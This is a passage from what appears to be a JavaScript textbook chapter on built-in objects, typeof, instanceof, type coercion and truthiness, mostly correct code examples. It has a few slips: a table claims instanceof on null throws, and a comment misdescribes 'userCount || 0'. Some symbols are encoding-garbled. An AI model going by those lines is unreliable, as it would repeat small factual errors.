// Conversion
arr.join(separator);
arr.toString();
```

**Array iteration:**

```javascript
let arr = ["a", "b", "c"];

// for loop
for (let i = 0; i < arr.length; i++) {
  console.log(arr[i]);
}

// for-of (values)
for (let value of arr) {
  console.log(value);
}

// for-in (indices, avoid)
for (let index in arr) {
  console.log(index);  // "0", "1", "2" (strings!)
}

// forEach
arr.forEach((value, index, array) => {
  console.log(value);
});
```

**Array-like objects:**

```javascript
let arrayLike = {
  0: "a",
  1: "b",
  2: "c",
  length: 3
};

// Convert to array
let arr1 = Array.from(arrayLike);
let arr2 = [...arrayLike];  // Only if iterable
let arr3 = Array.prototype.slice.call(arrayLike);
```

---

### `Function`

**Functions are first-class objects:**

```javascript
function f() {}
let g = function() {};
let h = () => {};

console.log(typeof f);  // "function"
console.log(f instanceof Object);  // true
```

**Function properties:**

```javascript
function example(a, b) {
  return a + b;
}

console.log(example.name);      // "example"
console.log(example.length);    // 2 (number of parameters)
console.log(example.prototype); // { constructor: example }
```

**Functions have methods:**

```javascript
function greet(greeting) {
  console.log(`${greeting}, ${this.name}`);
}

let user = { name: "Alice" };

// call: invoke with explicit 'this'
greet.call(user, "Hello");  // "Hello, Alice"

// apply: like call, but arguments as array
greet.apply(user, ["Hi"]);  // "Hi, Alice"

// bind: create new function with bound 'this'
let boundGreet = greet.bind(user, "Hey");
boundGreet();  // "Hey, Alice"
```

**Constructor functions:**

```javascript
function Person(name) {
  this.name = name;
}

let alice = new Person("Alice");
console.log(alice.name);  // "Alice"
console.log(alice instanceof Person);  // true
```

We'll cover functions in depth in later chapters.

---

### `Date`

**Represents dates and times:**

```javascript
let now = new Date();                    // Current date/time
let specific = new Date(2024, 0, 15);    // Jan 15, 2024 (month is 0-indexed!)
let fromString = new Date("2024-01-15"); // ISO 8601 string
let fromTimestamp = new Date(1705334400000);  // Milliseconds since epoch

console.log(typeof now);  // "object"
```

**Months are 0-indexed (gotcha!):**

```javascript
let jan = new Date(2024, 0, 15);  // January
let dec = new Date(2024, 11, 15); // December
```

**Getting components:**

```javascript
let date = new Date(2024, 0, 15, 14, 30, 45, 500);

date.getFullYear();    // 2024
date.getMonth();       // 0 (January)
date.getDate();        // 15
date.getDay();         // 1 (Monday, 0 = Sunday)
date.getHours();       // 14
date.getMinutes();     // 30
date.getSeconds();     // 45
date.getMilliseconds();// 500

// UTC versions
date.getUTCFullYear();
date.getUTCMonth();
// etc.
```

**Setting components:**

```javascript
let date = new Date();
date.setFullYear(2025);
date.setMonth(5);  // June
date.setDate(15);
date.setHours(12);
// etc.
```

**Timestamp:**

```javascript
let timestamp = Date.now();  // Current timestamp (milliseconds since Jan 1, 1970)
let timestamp2 = new Date().getTime();  // Same

let date = new Date(timestamp);  // Convert back to Date
```

**Date arithmetic:**

```javascript
let date1 = new Date(2024, 0, 15);
let date2 = new Date(2024, 0, 20);

let diff = date2 - date1;  // Difference in milliseconds
console.log(diff / 1000 / 60 / 60 / 24);  // 5 days
```

**Formatting:**

```javascript
let date = new Date();

date.toString();       // "Mon Jan 15 2024 14:30:45 GMT+0000"
date.toISOString();    // "2024-01-15T14:30:45.500Z"
date.toDateString();   // "Mon Jan 15 2024"
date.toTimeString();   // "14:30:45 GMT+0000"
date.toLocaleDateString();  // Locale-specific
date.toLocaleTimeString();  // Locale-specific
```

---

### `RegExp`

**Pattern matching:**

```javascript
let regex1 = /pattern/flags;
let regex2 = new RegExp("pattern", "flags");

console.log(typeof regex1);  // "object"
```

**Flags:**

```javascript
/pattern/i;   // i = case-insensitive
/pattern/g;   // g = global (find all matches)
/pattern/m;   // m = multiline (^ and $ match line boundaries)
/pattern/s;   // s = dotAll (. matches newlines)
/pattern/u;   // u = unicode (proper handling of surrogate pairs)
/pattern/y;   // y = sticky (match from lastIndex only)
```

**Testing:**

```javascript
let regex = /hello/i;
console.log(regex.test("Hello World"));  // true
console.log(regex.test("Goodbye"));      // false
```

**Matching:**

```javascript
let str = "The year is 2024";
let regex = /\d+/g;

// exec: returns match details
let match = regex.exec(str);
console.log(match);  // ["2024", index: 12, input: "...", groups: undefined]

// String.match
console.log(str.match(regex));  // ["2024"]

// String.matchAll (ES2020)
let matches = [...str.matchAll(/\d+/g)];
```

**Replacement:**

```javascript
let str = "Hello World";
console.log(str.replace(/world/i, "JavaScript"));  // "Hello JavaScript"

// With capture groups
let date = "2024-01-15";
console.log(date.replace(/(\d{4})-(\d{2})-(\d{2})/, "$2/$3/$1"));  // "01/15/2024"
```

**Splitting:**

```javascript
let str = "a,b,c";
console.log(str.split(/,/));  // ["a", "b", "c"]
```

We'll cover regex in detail in Chapter 7.

---

### `Map`

**Key-value pairs with any key type:**

```javascript
let map = new Map();

// Set
map.set("name", "Alice");
map.set(123, "numeric key");
map.set({}, "object key");

// Get
console.log(map.get("name"));  // "Alice"

// Has
console.log(map.has("name"));  // true

// Delete
map.delete("name");

// Size
console.log(map.size);  // 2

// Clear
map.clear();
```

**Any key type (unlike objects):**

```javascript
let map = new Map();

let objKey = { id: 1 };
let funcKey = function() {};
let symKey = Symbol("key");

map.set(objKey, "object value");
map.set(funcKey, "function value");
map.set(symKey, "symbol value");

console.log(map.get(objKey));   // "object value"
console.log(map.get(funcKey));  // "function value"
console.log(map.get(symKey));   // "symbol value"
```

**Iteration:**

```javascript
let map = new Map([
  ["a", 1],
  ["b", 2],
  ["c", 3]
]);

// for-of
for (let [key, value] of map) {
  console.log(key, value);
}

// forEach
map.forEach((value, key) => {
  console.log(key, value);
});

// Keys, values, entries
console.log([...map.keys()]);    // ["a", "b", "c"]
console.log([...map.values()]);  // [1, 2, 3]
console.log([...map.entries()]); // [["a", 1], ["b", 2], ["c", 3]]
```

**Map vs Object:**

```javascript
// Object: keys are always strings (or symbols)
let obj = {};
obj[{ key: "object" }] = "value";
console.log(obj);  // { "[object Object]": "value" }

// Map: keys can be anything
let map = new Map();
map.set({ key: "object" }, "value");
console.log(map);  // Map { { key: "object" } => "value" }
```

---

### `WeakMap`

**Like Map, but:**

- Keys must be objects
- Keys are weakly referenced (garbage collected if no other references)
- Not iterable
- No `size` property

```javascript
let weakMap = new WeakMap();

let obj1 = { id: 1 };
let obj2 = { id: 2 };

weakMap.set(obj1, "value1");
weakMap.set(obj2, "value2");

console.log(weakMap.get(obj1));  // "value1"

// If obj1 goes out of scope and has no other references:
obj1 = null;  // Entry automatically removed from WeakMap (garbage collected)

// Cannot iterate
// console.log([...weakMap]);  // TypeError
```

**Use case: Private data:**

```javascript
let privateData = new WeakMap();

class User {
  constructor(name) {
    privateData.set(this, { name });
  }
  
  getName() {
    return privateData.get(this).name;
  }
}

let user = new User("Alice");
console.log(user.getName());  // "Alice"
// No way to access privateData from outside
```

---

### `Set`

**Collection of unique values:**

```javascript
let set = new Set();

// Add
set.add(1);
set.add(2);
set.add(2);  // Duplicate, ignored

// Has
console.log(set.has(1));  // true

// Delete
set.delete(1);

// Size
console.log(set.size);  // 1

// Clear
set.clear();
```

**Initialization:**

```javascript
let set = new Set([1, 2, 3, 2, 1]);  // Duplicates removed
console.log([...set]);  // [1, 2, 3]
```

**Iteration:**

```javascript
let set = new Set(["a", "b", "c"]);

// for-of
for (let value of set) {
  console.log(value);
}

// forEach
set.forEach(value => {
  console.log(value);
});

// values(), keys(), entries()
console.log([...set.values()]);  // ["a", "b", "c"]
console.log([...set.keys()]);    // ["a", "b", "c"] (same as values)
console.log([...set.entries()]); // [["a", "a"], ["b", "b"], ["c", "c"]]
```

**Use case: Remove duplicates:**

```javascript
let arr = [1, 2, 3, 2, 1];
let unique = [...new Set(arr)];
console.log(unique);  // [1, 2, 3]
```

---

### `WeakSet`

**Like Set, but:**

- Values must be objects
- Values are weakly referenced
- Not iterable
- No `size` property

```javascript
let weakSet = new WeakSet();

let obj1 = { id: 1 };
let obj2 = { id: 2 };

weakSet.add(obj1);
weakSet.add(obj2);

console.log(weakSet.has(obj1));  // true

obj1 = null;  // Entry automatically removed (garbage collected)
```

**Use case: Track object existence:**

```javascript
let visitedNodes = new WeakSet();

function traverse(node) {
  if (visitedNodes.has(node)) return;
  
  visitedNodes.add(node);
  // Process node
}
```

---

### Typed Arrays

**Binary data in array-like structures:**

**Types:**

```javascript
Int8Array       // 8-bit signed integer
Uint8Array      // 8-bit unsigned integer
Uint8ClampedArray  // 8-bit unsigned (clamped)
Int16Array      // 16-bit signed integer
Uint16Array     // 16-bit unsigned integer
Int32Array      // 32-bit signed integer
Uint32Array     // 32-bit unsigned integer
Float32Array    // 32-bit float
Float64Array    // 64-bit float
BigInt64Array   // 64-bit signed BigInt
BigUint64Array  // 64-bit unsigned BigInt
```

**Creating:**

```javascript
// From length
let arr1 = new Uint8Array(10);  // 10 elements, initialized to 0

// From array-like
let arr2 = new Uint8Array([1, 2, 3]);

// From ArrayBuffer
let buffer = new ArrayBuffer(16);  // 16 bytes
let arr3 = new Uint8Array(buffer);
```

**Characteristics:**

```javascript
let arr = new Uint8Array([1, 2, 3]);

arr.length;         // 3
arr.byteLength;     // 3 (bytes)
arr.byteOffset;     // 0
arr.buffer;         // Underlying ArrayBuffer

arr[0] = 255;
arr[1] = 256;  // Wraps to 0 (overflow)
console.log(arr);  // Uint8Array [255, 0, 3]
```

**Clamping (Uint8ClampedArray):**

```javascript
let arr = new Uint8ClampedArray([1, 2, 3]);
arr[0] = 300;   // Clamped to 255 (max)
arr[1] = -10;   // Clamped to 0 (min)
console.log(arr);  // Uint8ClampedArray [255, 0, 3]
```

**Use case: Binary data, WebGL, Canvas, file I/O**

---

### `ArrayBuffer`

**Raw binary data (fixed-length):**

```javascript
let buffer = new ArrayBuffer(16);  // 16 bytes
console.log(buffer.byteLength);    // 16

// Cannot read/write directly, need a view
let view = new Uint8Array(buffer);
view[0] = 255;
```

**Multiple views on same buffer:**

```javascript
let buffer = new ArrayBuffer(8);

let view1 = new Uint8Array(buffer);   // 8 Ã— 1-byte elements
let view2 = new Uint16Array(buffer);  // 4 Ã— 2-byte elements
let view3 = new Uint32Array(buffer);  // 2 Ã— 4-byte elements

view1[0] = 255;
console.log(view2[0]);  // 255 (same bytes)
console.log(view3[0]);  // 255 (same bytes)
```

---

### `SharedArrayBuffer`

**Shared memory between workers:**

```javascript
// Main thread
let sab = new SharedArrayBuffer(1024);
worker.postMessage(sab);

// Worker thread
onmessage = (e) => {
  let sab = e.data;  // Same SharedArrayBuffer
  let view = new Uint8Array(sab);
  view[0] = 123;  // Modifies shared memory
};
```

**Requires atomics for safe concurrent access:**

```javascript
let sab = new SharedArrayBuffer(4);
let view = new Int32Array(sab);

// Atomic operations
Atomics.add(view, 0, 10);   // Atomically add 10
Atomics.sub(view, 0, 5);    // Atomically subtract 5
Atomics.load(view, 0);      // Atomically read
Atomics.store(view, 0, 42); // Atomically write
```

**Security:** Disabled by default due to Spectre. Requires COOP/COEP headers.

---

### `DataView`

**Low-level reading/writing with explicit endianness:**

```javascript
let buffer = new ArrayBuffer(8);
let view = new DataView(buffer);

// Write (little-endian by default)
view.setUint8(0, 255);
view.setUint16(1, 1234, true);   // little-endian
view.setUint32(3, 5678, false);  // big-endian

// Read
view.getUint8(0);          // 255
view.getUint16(1, true);   // 1234
view.getUint32(3, false);  // 5678
```

**Use case: Binary protocols, file formats**

---

### `Promise`

**Represents asynchronous operation result:**

```javascript
let promise = new Promise((resolve, reject) => {
  setTimeout(() => resolve("done"), 1000);
});

promise.then(result => console.log(result));  // "done" (after 1 second)
```

**States:**

- **Pending:** Initial state
- **Fulfilled:** Operation completed successfully
- **Rejected:** Operation failed

```javascript
let promise = new Promise((resolve, reject) => {
  let success = true;
  
  if (success) {
    resolve("Success!");
  } else {
    reject("Error!");
  }
});

promise
  .then(result => console.log(result))   // "Success!"
  .catch(error => console.log(error));
```

**Chaining:**

```javascript
fetch("/api/user")
  .then(response => response.json())
  .then(data => console.log(data))
  .catch(error => console.error(error));
```

We'll cover Promises in depth in Chapter 10.

---

### `Proxy`

**Intercept operations on objects:**

```javascript
let target = { name: "Alice" };

let proxy = new Proxy(target, {
  get(target, prop) {
    console.log(`Getting ${prop}`);
    return target[prop];
  },
  set(target, prop, value) {
    console.log(`Setting ${prop} to ${value}`);
    target[prop] = value;
    return true;
  }
});

proxy.name;         // Logs: "Getting name", returns "Alice"
proxy.name = "Bob"; // Logs: "Setting name to Bob"
```

**Traps (interceptable operations):**

```javascript
get, set, has, deleteProperty, apply, construct,
getPrototypeOf, setPrototypeOf, isExtensible,
preventExtensions, getOwnPropertyDescriptor,
defineProperty, ownKeys
```

**Use case: Validation, logging, reactivity**

```javascript
let validator = {
  set(target, prop, value) {
    if (prop === "age" && typeof value !== "number") {
      throw new TypeError("Age must be a number");
    }
    target[prop] = value;
    return true;
  }
};

let person = new Proxy({}, validator);
person.age = 30;    // OK
person.age = "30";  // TypeError: Age must be a number
```

---

### `WeakRef`

**Weak reference to object (doesn't prevent garbage collection):**

```javascript
let obj = { data: "important" };
let weakRef = new WeakRef(obj);

// Get reference
console.log(weakRef.deref());  // { data: "important" }

// If obj is garbage collected:
obj = null;
// Later...
console.log(weakRef.deref());  // undefined (object was GC'd)
```

**Use case: Caching without memory leaks**

---

### `FinalizationRegistry`

**Run callback when object is garbage collected:**

```javascript
let registry = new FinalizationRegistry((heldValue) => {
  console.log(`Object with value ${heldValue} was garbage collected`);
});

let obj = { data: "important" };
registry.register(obj, "myObject");

// When obj is garbage collected:
obj = null;
// Eventually logs: "Object with value myObject was garbage collected"
```

**Use case: Cleanup resources (file handles, network connections)**

---

### 1.3.4 Type Summary

### Primitive Types

|Type|typeof|Values|Mutable|Example|
|---|---|---|---|---|
|`undefined`|`undefined`|`undefined`|No|`undefined`|
|`null`|`object`|`null`|No|`null`|
|`boolean`|`boolean`|`true`, `false`|No|`true`|
|`number`|`number`|IEEE 754 floats|No|`42`, `3.14`, `NaN`|
|`bigint`|`bigint`|Arbitrary-size integers|No|`123n`|
|`string`|`string`|UTF-16 code units|No|`"hello"`|
|`symbol`|`symbol`|Unique values|No|`Symbol("id")`|

### Reference Types

|Type|typeof|Description|
|---|---|---|
|`Object`|`object`|Key-value pairs|
|`Array`|`object`|Ordered collection|
|`Function`|`function`|Callable object|
|`Date`|`object`|Date/time|
|`RegExp`|`object`|Regular expression|
|`Map`|`object`|Key-value (any key type)|
|`WeakMap`|`object`|Weakly-held key-value|
|`Set`|`object`|Unique values|
|`WeakSet`|`object`|Weakly-held unique values|
|Typed Arrays|`object`|Binary typed data|
|`ArrayBuffer`|`object`|Raw binary buffer|
|`SharedArrayBuffer`|`object`|Shared binary buffer|
|`DataView`|`object`|Low-level buffer view|
|`Promise`|`object`|Asynchronous result|
|`Proxy`|`object`|Object operation interceptor|
|`WeakRef`|`object`|Weak object reference|
|`FinalizationRegistry`|`object`|GC cleanup callback|

---

## 1.4 Type System

### 1.4.1 Type Checking with `typeof`

### Basic Behavior

`typeof` returns a **string** indicating the type of the operand:

```javascript
typeof undefined;        // "undefined"
typeof null;             // "object" (BUG!)
typeof true;             // "boolean"
typeof 42;               // "number"
typeof 42n;              // "bigint"
typeof "hello";          // "string"
typeof Symbol("id");     // "symbol"
typeof {};               // "object"
typeof [];               // "object"
typeof function(){};     // "function"
```

---

### Return Values

`typeof` returns exactly **8 possible strings**:

1. `"undefined"`
2. `"boolean"`
3. `"number"`
4. `"bigint"`
5. `"string"`
6. `"symbol"`
7. `"object"` (includes `null`, arrays, plain objects, dates, regex, etc.)
8. `"function"` (special case for callable objects)

---

### The `typeof null` Bug

This is JavaScript's most famous bug:

```javascript
typeof null;  // "object" (WRONG!)
```

**Why it exists:**

In the original JavaScript implementation (1995), values were stored with a type tag:

- `000`: object
- `001`: integer
- `010`: double
- `100`: string
- `110`: boolean

`null` was represented as the NULL pointer (all zeros: `0x00`), which matched the object tag `000`.

**Cannot be fixed:** Changing this would break millions of websites that depend on this behavior.

**Correct check for `null`:**

```javascript
// Wrong
if (typeof value === "object") {
  // Matches null too!
}

// Correct
if (value === null) {
  // ...
}

// Check for object (excluding null)
if (typeof value === "object" && value !== null) {
  // ...
}
```

---

### `typeof` with Undeclared Variables

`typeof` is "safe" for undeclared variables (doesn't throw ReferenceError):

```javascript
// Variable not declared
typeof undeclaredVariable;  // "undefined" (no error!)

// vs direct access
undeclaredVariable;  // ReferenceError: undeclaredVariable is not defined
```

**But beware of TDZ:**

```javascript
{
  typeof x;  // ReferenceError: Cannot access 'x' before initialization
  let x = 10;
}
```

Variables in the Temporal Dead Zone throw ReferenceError even with `typeof`.

---

### `typeof` with Arrays and Objects

**Cannot distinguish arrays from objects:**

```javascript
typeof [];   // "object"
typeof {};   // "object"

// Use Array.isArray
Array.isArray([]);   // true
Array.isArray({});   // false
```

**Cannot distinguish different object types:**

```javascript
typeof new Date();    // "object"
typeof /regex/;       // "object"
typeof new Map();     // "object"

// Use instanceof or constructor check
```

---

### `typeof` with Functions

Functions are detected separately:

```javascript
typeof function(){};           // "function"
typeof (() => {});             // "function"
typeof class {};               // "function" (classes are functions)
typeof async function(){};     // "function"
typeof function*(){};          // "function" (generators)

// Built-in constructors
typeof Array;                  // "function"
typeof Object;                 // "function"
```

**But not callable objects:**

```javascript
let callable = {
  call() { }
};
typeof callable;  // "object" (not "function")
```

---

### Practical Usage Patterns

**Type guards:**

```javascript
function processValue(value) {
  if (typeof value === "string") {
    return value.toUpperCase();
  }
  if (typeof value === "number") {
    return value.toFixed(2);
  }
  if (typeof value === "object" && value !== null) {
    return JSON.stringify(value);
  }
  return String(value);
}
```

**Safe property access:**

```javascript
// Check if method exists
if (typeof obj.method === "function") {
  obj.method();
}

// Check for feature support
if (typeof Promise !== "undefined") {
  // Use Promises
}
```

---

### 1.4.2 Type Checking with `instanceof`

### Basic Behavior

`instanceof` checks if an object's prototype chain contains a constructor's prototype:

```javascript
[] instanceof Array;           // true
[] instanceof Object;          // true
({}) instanceof Object;        // true
({}) instanceof Array;         // false

new Date() instanceof Date;    // true
/regex/ instanceof RegExp;     // true
```

**Syntax:**

```javascript
object instanceof Constructor
```

---

### How `instanceof` Works

`instanceof` walks the prototype chain:

```javascript
function isInstanceOf(obj, Constructor) {
  let proto = Object.getPrototypeOf(obj);
  
  while (proto !== null) {
    if (proto === Constructor.prototype) {
      return true;
    }
    proto = Object.getPrototypeOf(proto);
  }
  
  return false;
}
```

**Example:**

```javascript
let arr = [];

// Prototype chain:
// arr â†’ Array.prototype â†’ Object.prototype â†’ null

arr instanceof Array;   // true (Array.prototype found)
arr instanceof Object;  // true (Object.prototype found)
arr instanceof String;  // false (String.prototype not in chain)
```

---

### Primitives and `instanceof`

**Primitives are not objects, so `instanceof` returns `false`:**

```javascript
"hello" instanceof String;   // false
42 instanceof Number;        // false
true instanceof Boolean;     // false

// But boxed primitives are objects
new String("hello") instanceof String;  // true
new Number(42) instanceof Number;       // true
new Boolean(true) instanceof Boolean;   // true
```

---

### Cross-Realm Issues

`instanceof` fails across different execution contexts (iframes, windows):

```javascript
// In iframe
let iframeArray = iframeWindow.Array;
let arr = new iframeArray(1, 2, 3);

// In parent window
arr instanceof Array;  // false (different Array constructor!)

// Solution: Use Array.isArray
Array.isArray(arr);  // true (works cross-realm)
```

---

### Custom `instanceof` Behavior

**Use `Symbol.hasInstance` to customize:**

```javascript
class MyClass {
  static [Symbol.hasInstance](instance) {
    return instance.customProp === true;
  }
}

let obj = { customProp: true };
console.log(obj instanceof MyClass);  // true (custom logic!)
```

---

### Checking Constructor

**Right-hand side must be a function with `prototype` property:**

```javascript
{} instanceof Object;     // true
{} instanceof Function;   // false

// Error cases
{} instanceof {};         // TypeError: Right-hand side is not callable
{} instanceof 42;         // TypeError: Right-hand side is not callable
```

---

### `instanceof` vs `typeof`

|Check|`typeof`|`instanceof`|
|---|---|---|
|Primitives|âœ“ (accurate)|âœ— (always false)|
|Objects|"object"|âœ“ (specific type)|
|Functions|"function"|âœ“ (Function)|
|Arrays|"object"|âœ“ (Array)|
|`null`|"object" (bug)|âœ— (error)|
|Cross-realm|âœ“ (works)|âœ— (fails)|
|Undeclared variables|âœ“ (safe)|âœ— (ReferenceError)|

---

### 1.4.3 Type Coercion (Implicit Conversion)

### Why Coercion Causes Bugs

Type coercion is **automatic type conversion** performed by JavaScript. It's the source of infamous quirks like:

```javascript
[] + []      // "" (empty string!)
[] + {}      // "[object Object]"
{} + []      // 0 (or "[object Object]" depending on context)
"5" - 3      // 2 (number)
"5" + 3      // "53" (string!)
```

Understanding coercion rules prevents:
- Unexpected string concatenation instead of addition
- Silent NaN bugs from invalid conversions
- Confusing truthy/falsy behavior in conditionals

**The golden rule:** When in doubt, convert explicitly with `Number()`, `String()`, or `Boolean()`.

---

### String Coercion

**Triggered by `+` operator with a string:**

```javascript
"hello" + 42;        // "hello42"
42 + "hello";        // "42hello"
"" + 42;             // "42"
42 + "";             // "42"

// Complex types convert to string
"value: " + {};      // "value: [object Object]"
"value: " + [];      // "value: "
"value: " + [1,2];   // "value: 1,2"
"value: " + function(){};  // "value: function(){}"
```

**`+` with only one string coerces all operands:**

```javascript
1 + 2 + "3";    // "33" (left-to-right: 3 + "3")
"1" + 2 + 3;    // "123" (left-to-right: "1" + 2, then + 3)
```

**Template literals coerce to string:**

```javascript
`Value: ${42}`;      // "Value: 42"
`Value: ${null}`;    // "Value: null"
`Value: ${{}}`;      // "Value: [object Object]"
```

---

### Numeric Coercion

**Triggered by arithmetic operators (except `+`):**

```javascript
"42" - 2;       // 40 (number)
"42" * 2;       // 84
"42" / 2;       // 21
"42" % 5;       // 2
"42" ** 2;      // 1764

// Unary plus
+"42";          // 42 (number)
+true;          // 1
+false;         // 0
+null;          // 0
+undefined;     // NaN
+"";            // 0
+"hello";       // NaN
```

**Subtraction always coerces:**

```javascript
"5" - "2";      // 3 (both converted to numbers)
"5" - true;     // 4 (true â†’ 1)
"5" - null;     // 5 (null â†’ 0)
"5" - undefined;// NaN (undefined â†’ NaN)
```

**Array to number coercion:**

```javascript
+[];            // 0 ([] â†’ "" â†’ 0)
+[5];           // 5 ([5] â†’ "5" â†’ 5)
+[1,2];         // NaN ([1,2] â†’ "1,2" â†’ NaN)
```

**Object to number coercion:**

```javascript
+{};            // NaN ({} â†’ "[object Object]" â†’ NaN)

// Custom valueOf
let obj = {
  valueOf() { return 42; }
};
+obj;           // 42
```

---

### Boolean Coercion

**Triggered by logical contexts:**

```javascript
if (value) { }
while (value) { }
value ? a : b
!value
!!value
Boolean(value)
```

**Falsy values (8 total):**

```javascript
Boolean(false);      // false
Boolean(0);          // false
Boolean(-0);         // false
Boolean(0n);         // false (BigInt zero)
Boolean("");         // false
Boolean(null);       // false
Boolean(undefined);  // false
Boolean(NaN);        // false
```

**Everything else is truthy:**

```javascript
Boolean(true);       // true
Boolean(1);          // true
Boolean(-1);         // true
Boolean("0");        // true (non-empty string)
Boolean("false");    // true
Boolean([]);         // true (empty array is an object)
Boolean({});         // true
Boolean(function(){}); // true
```

**Common gotchas:**

```javascript
if ([]) {
  // This runs! Arrays are truthy
}

if ([] == false) {
  // This also runs! Coerces differently in comparison
}

// Checking array emptiness
if (arr.length) {
  // This is the correct check
}
```

---

### Object to Primitive Coercion

Objects convert to primitives via these steps:

1. Call `obj[Symbol.toPrimitive](hint)` if exists
2. Otherwise, if hint is `"string"`:
    - Call `obj.toString()`, if result is primitive, use it
    - Else call `obj.valueOf()`, if result is primitive, use it
3. Otherwise (hint is `"number"` or `"default"`):
    - Call `obj.valueOf()`, if result is primitive, use it
    - Else call `obj.toString()`, if result is primitive, use it
4. Throw TypeError if no primitive obtained

**Example:**

```javascript
let obj = {
  valueOf() {
    console.log("valueOf called");
    return 42;
  },
  toString() {
    console.log("toString called");
    return "hello";
  }
};

// Numeric context (hint: "number")
+obj;           // Logs: "valueOf called", returns 42
obj - 1;        // Logs: "valueOf called", returns 41

// String context (hint: "string")
String(obj);    // Logs: "toString called", returns "hello"
`${obj}`;       // Logs: "toString called", returns "hello"

// Default context (usually numeric)
obj == 42;      // Logs: "valueOf called", returns true
```

**Custom `Symbol.toPrimitive`:**

```javascript
let obj = {
  [Symbol.toPrimitive](hint) {
    console.log(`hint: ${hint}`);
    if (hint === "number") return 42;
    if (hint === "string") return "hello";
    return true;  // default
  }
};

+obj;           // Logs: "hint: number", returns 42
String(obj);    // Logs: "hint: string", returns "hello"
obj == true;    // Logs: "hint: default", returns true
```

---

### Date to Primitive

**`Date` is special:** Default hint is `"string"` (not `"number"`):

```javascript
let date = new Date();

// String context
String(date);     // "Fri Feb 06 2026 ..."
`${date}`;        // "Fri Feb 06 2026 ..."

// Numeric context
+date;            // 1770318000000 (timestamp)
date.valueOf();   // 1770318000000

// Default context (uses string!)
date + "";        // "Fri Feb 06 2026 ..." (not timestamp!)
```

---

### Array to String Coercion

Arrays convert to comma-separated string:

```javascript
String([1, 2, 3]);     // "1,2,3"
[1, 2, 3] + "";        // "1,2,3"
[1, 2, 3].toString();  // "1,2,3"

String([]);            // ""
String([5]);           // "5"
String([undefined]);   // ""
String([null]);        // ""
String([[]]);          // ""
```

**This causes surprising behavior:**

```javascript
[] + [];        // "" (both become "")
[] + {};        // "[object Object]"
{} + [];        // 0 (parsed as empty block + [])
({} + []);      // "[object Object]"
```

---

### 1.4.4 Type Conversion (Explicit)

Explicit conversion uses constructors or functions to convert types.

---

### To String

```javascript
String(42);              // "42"
String(true);            // "true"
String(null);            // "null"
String(undefined);       // "undefined"
String({});              // "[object Object]"
String([1, 2]);          // "1,2"

// toString method
(42).toString();         // "42"
true.toString();         // "true"
({}).toString();         // "[object Object]"
[1, 2].toString();       // "1,2"

// Template literal
`${42}`;                 // "42"

// Concatenation
"" + 42;                 // "42"
```

---

### To Number

```javascript
Number("42");            // 42
Number("3.14");          // 3.14
Number("");              // 0 (empty string â†’ 0)
Number("  ");            // 0 (whitespace â†’ 0)
Number("hello");         // NaN
Number(true);            // 1
Number(false);           // 0
Number(null);            // 0
Number(undefined);       // NaN
Number([]);              // 0
Number([5]);             // 5
Number([1, 2]);          // NaN
Number({});              // NaN

// Unary plus
+"42";                   // 42

// parseInt/parseFloat
parseInt("42");          // 42
parseInt("42.5");        // 42 (truncates)
parseInt("42px");        // 42 (stops at non-digit)
parseFloat("3.14");      // 3.14
parseFloat("3.14.15");   // 3.14 (stops at second dot)

// Arithmetic
"42" - 0;                // 42
"42" * 1;                // 42
```

**`parseInt` with radix:**

```javascript
parseInt("10", 10);      // 10 (decimal)
parseInt("10", 2);       // 2 (binary)
parseInt("10", 16);      // 16 (hex)
parseInt("FF", 16);      // 255

// Always specify radix
parseInt("08");          // 8 (modern: decimal, old: octal)
parseInt("08", 10);      // 8 (explicit decimal)
```

---

### To Boolean

```javascript
Boolean(0);              // false
Boolean(1);              // true
Boolean("");             // false
Boolean("hello");        // true
Boolean(null);           // false
Boolean(undefined);      // false
Boolean({});             // true
Boolean([]);             // true

// Double negation
!!0;                     // false
!!1;                     // true
!!"";                    // false
!!"hello";               // true

// Conditional
if (value) { }           // Implicit conversion
```

---

### To Object (Boxing)

Primitives can be wrapped in objects:

```javascript
Object(42);              // Number {42}
Object("hello");         // String {"hello"}
Object(true);            // Boolean {true}

new Number(42);          // Number {42}
new String("hello");     // String {"hello"}
new Boolean(true);       // Boolean {true}

// Primitives auto-box when accessing properties
"hello".length;          // 5 (auto-boxed to String object)
(42).toFixed(2);         // "42.00" (auto-boxed to Number object)
```

**Avoid explicit boxing:**

```javascript
let num = new Number(42);
console.log(typeof num);     // "object"
console.log(num === 42);     // false (object !== primitive)
console.log(num == 42);      // true (coerces to primitive)

if (new Boolean(false)) {
  // This runs! Object wrapper is truthy
}
```

---

### 1.4.5 Truthiness and Falsiness

### Falsy Values

Exactly **8 falsy values** in JavaScript:

```javascript
false
0
-0
0n              // BigInt zero (ES2020)
""              // Empty string
null
undefined
NaN
```

**All tested:**

```javascript
console.log(!!false);      // false
console.log(!!0);          // false
console.log(!!-0);         // false
console.log(!!0n);         // false
console.log(!!"");         // false
console.log(!!null);       // false
console.log(!!undefined);  // false
console.log(!!NaN);        // false
```

---

### Truthy Values

**Everything else is truthy:**

```javascript
// Numbers
!!1;                 // true
!!-1;                // true
!!Infinity;          // true
!!42n;               // true (BigInt non-zero)

// Strings
!!"0";               // true (non-empty string)
!!"false";           // true
!!" ";               // true (whitespace is non-empty)

// Objects
!!{};                // true
!![];                // true
!!function(){};      // true
!!new Boolean(false);// true (object wrapper)
!!new Number(0);     // true
!!new String("");    // true
```

---

### Common Gotchas

**Empty array/object:**

```javascript
let arr = [];
let obj = {};

if (arr) {
  // This runs! Arrays are truthy
}

if (obj) {
  // This runs! Objects are truthy
}

// Correct checks
if (arr.length) { }
if (Object.keys(obj).length) { }
```

**String `"0"` and `"false"`:**

```javascript
if ("0") {
  // This runs! Non-empty strings are truthy
}

if ("false") {
  // This runs too!
}
```

**Document methods (DOM quirk):**

```javascript
// In some browsers
let all = document.all;
typeof all;          // "undefined" (lie!)
if (all) { }         // Doesn't run (all is falsy!)

// document.all is the only falsy object in existence
```

---

### Conditional Patterns

**Default values:**

```javascript
let name = userInput || "Anonymous";

// But beware of falsy legitimate values
let count = userCount || 0;  // Wrong! If userCount is 0, uses 0 default
let count = userCount ?? 0;  // Correct: nullish coalescing (ES2020)
```

**Short-circuit evaluation:**

```javascript
// AND (returns first falsy or last value)
true && "yes";       // "yes"
false && "yes";      // false
null && "yes";       // null
0 && "yes";          // 0
"" && "yes";         // ""
"a" && "b" && "c";   // "c"

// OR (returns first truthy or last value)
true || "no";        // true
false || "no";       // "no"
null || "no";        // "no"
0 || "no";           // "no"
"" || "no";          // "no"
"a" || "b" || "c";   // "a"
```

---

### 1.4.6 Equality Operators

JavaScript has **three equality operators:**

1. `==` (loose/abstract equality)
2. `===` (strict equality)
